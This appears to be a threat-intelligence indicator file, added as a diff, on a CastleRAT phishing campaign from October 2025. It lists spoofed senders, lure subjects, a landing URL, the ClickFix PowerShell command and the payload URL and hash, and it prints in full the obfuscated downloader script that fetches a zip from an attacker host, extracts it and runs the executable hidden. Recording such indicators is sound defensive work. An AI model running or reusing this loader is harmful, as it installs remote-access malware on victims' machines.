@@ -1,0 +1,116 @@
+CastleRAT | 404TDS URLs | Clickfix | apip | 18-22 October 2025
+
+Messages with characteristics (Examples):
+
+From:
+````
+Ali Pamela <vincent.dignard@csdufer.qc.ca>
+Andrade Laura <cristina.holmlund@arvidsjaurnet.se>
+Erickson Heather <mojs@mail.se>
+Fitzpatrick Andrea <info@fat-boys-munich.bayern>
+Fitzpatrick Andrea <kelly.tichenor@usd363.com>
+Rodgers Emma <studio@associati-to.it>
+Rodgers Emma <studio@associati-to.it>
+Debra Singh <pavel.nasuhin@megatitan.ru>
+Debra Singh <kartik@quickadsmedia.com>
+Debra Singh <mouri@t-r.jp>
+Rodgers Carol <johan@bakufu.com.sg>
+Debra Singh <mouri@t-r.jp>
+Debra Singh <presidence@ccimsf.com>
+Debra Singh <contact@frederictari.com>
+Debra Singh <mouri@t-r.jp>
+Debra Singh <webmaster@caffepabios.it>
+Debra Singh <chialearreda@chiale.it>
+````
+
+Subject:
+````
+time for answer on request visitor
+time for reply on request guest
+time for reply on request visitor
+your attention is required notice reply to guest
+[...]
+````
+
+
+Landing
+```
+https://booking.guest-to-reply.com/
+```
+
+Clickfix
+```
+powershell -w h -ep b -nop -c "$h='biksaok.c'+'om/upd';iex(iwr $h -useb).Content"
+```
+
+Contents of PowerShell Script
+```
+$ErrorActionPreference = 'Si'+'lent'+'ly'+'Con'+'tin'+'ue'
+$v1=200;$v2=800;$v3=3;$v4=0x10;
+function s{param($a=200,$b=800);Start-Sleep -m (Get-Random -Mi $a -Ma $b)}
+if($PSVersionTable.PSVersion.Major -lt 2){exit}
+try{
+$d=(gi Env:TEMP).Value;s
+$z=$d+"\"+('ag'+'upd'+'.z'+'ip');$h=('b'+'ik'+'sa'+'ok'+'.c'+'om');$l=('ht'+'tps'+'://'+$h+'/ap'+'ip'+'/f'+'/f')
+$p=gps -N ('c'+'ns') -EA 0;if($p){exit}
+$e=$d+"\"+('co'+'ns'+'\c'+'ns'+'.e'+'xe');if(!(Test-Path $e)){$e=$d+"\"+('c'+'ns'+'.e'+'xe')}
+if(Test-Path $e){
+try{saps -F $e -W Hidden -EA 0}catch{try{$w=New-Object -C ('WS'+'cr'+'ipt'+'.S'+'he'+'ll');$w.Run(("`""+$e+"`""),0,$false)}catch{}};exit}
+try{
+if($PSVersionTable.PSVersion.Major -ge 3){
+  try{[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11}catch{}
+  $wc = New-Object System.Net.WebClient
+  $wc.Headers.Add(('Us'+'er-'+'Ag'+'ent'),('Po'+'wer'+'Sh'+'ell'))
+  $wc.DownloadFile($l,$z)
+}else{
+  $w=New-Object System.Net.WebClient;$w.Headers.Add(('Us'+'er-'+'Ag'+'ent'),('Po'+'wer'+'Sh'+'ell'))
+  try{[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11}catch{}
+  $w.DownloadFile($l,$z)
+}
+}catch{
+$w=New-Object System.Net.WebClient;$w.Headers.Add(('Us'+'er-'+'Ag'+'ent'),('Po'+'wer'+'Sh'+'ell'))
+try{[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11}catch{}
+try{$w.DownloadFile($l,$z)}catch{}
+};s
+if(Test-Path $z){
+try{
+  $shell = New-Object -ComObject ('Sh'+'ell'+'.A'+'pp'+'lic'+'ation')
+  $zip = $shell.NameSpace($z)
+  $dest = $shell.NameSpace($d)
+  if($zip -ne $null){
+    $dest.CopyHere($zip.Items(),0x14)
+  }
+}catch{
+  try{
+    Add-Type -AssemblyName ('Sy'+'st'+'em'+'.I'+'O.C'+'om'+'pr'+'es'+'si'+'on'+'.F'+'il'+'eS'+'ys'+'tem') -EA 0
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($z,$d)
+  }catch{
+    try{
+      if($PSVersionTable.PSVersion.Major -ge 5){
+        Expand-Archive -Path $z -DestinationPath $d -Force -EA 0
+      }
+    }catch{}
+  }
+}}
+s;$e=$d+"\"+('co'+'ns'+'\c'+'ns'+'.e'+'xe');if(!(Test-Path $e)){$e=$d+"\"+('c'+'ns'+'.e'+'xe')}
+if(!(Test-Path $e)){$g=gci -Path $d -Filter ('*'+'.e'+'xe') -Recurse -EA 0|select -First 1;if($g){$e=$g.FullName}}
+if(Test-Path $e){
+s;try{saps -FilePath $e -WindowStyle Hidden -EA 0}catch{try{$w=New-Object -ComObject ('WS'+'cr'+'ipt'+'.S'+'he'+'ll');$w.Run(("`""+$e+"`""),0,$false)}catch{try{cmd /c start /b ("`""+$e+"`"")}catch{try{& $e}catch{}}}}}
+s -a 1500 -b 3000
+try{
+  if(Test-Path $z){
+    for($i=0;$i -lt 3;$i++){
+      try{Remove-Item -Path $z -Force -EA 0;break}catch{s -a 300 -b 600}
+    }
+  }
+}catch{}
+}catch{}
+```
+
+URL to Zip File
+```
+https://biksaok.com/apip/f/f 
+
+agupd.zip
+2ca4752ad18b560186cee7e5579e5deda443c44282b2d6008d2e90f80fe6292e
+```
